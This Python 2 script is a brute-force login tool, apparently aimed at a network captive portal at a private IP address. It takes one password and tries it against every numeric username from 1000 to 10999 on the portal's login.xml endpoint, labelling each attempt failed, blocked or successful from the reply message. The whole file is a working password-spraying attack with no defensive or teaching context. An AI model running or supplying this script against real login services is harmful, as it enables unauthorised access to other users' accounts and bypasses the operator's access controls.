import sys,urllib,urllib2,time
from xml.dom.minidom import parseString
url='https://172.16.1.1:8090'
password=input()
for x in range(1000,11000):
    if x<10000:
        x="0"+str(x)
    data = {"mode":"191","username":x,"password":password}
    content=urllib2.urlopen(url + "/login.xml", urllib.urlencode(data) , timeout=3)
    data=content.read()
    simple=parseString(data)
    mtag=simple.getElementsByTagName('message')[0].toxml()
    message=mtag.replace('<message>','').replace('</message','').replace('<message/>','')
    failmssg="<![CDATA[The system could not log you on. Make sure your password is correct]]>>"
    blockmssg="<![CDATA[You are not allowed to login at this time]]>>"
    if message==failmssg:
        print "{0} - f".format(x)
    elif message==blockmssg:
        print "{0} - blocked".format(x)
    else:
        print "{0} - success".format(x)

        
